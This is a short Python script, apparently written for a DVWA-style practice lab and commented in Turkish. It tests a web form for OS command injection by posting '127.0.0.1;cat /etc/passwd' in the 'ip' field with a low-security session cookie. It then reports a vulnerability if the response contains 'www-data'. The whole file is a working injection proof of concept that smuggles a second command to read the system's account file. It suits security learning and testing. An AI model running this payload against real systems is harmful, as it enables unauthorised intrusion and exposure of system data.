import requests
import json
#html command ınjection
header={"Cookie": "security=low; PHPSESSID=34127381273dsajdjaslkdas812730812dasjdnajlksndjkla"}
url = "http://192.168.1.41/dizin/dizin/exec/"
data = {"ip":"127.0.0.1;cat /etc/passwd","submit":"submit"}
sonuc = requests.post(url=url, data=data, headers=header)
if str("www-data") in str(sonuc.content):
    print("Command injection açığı var: ")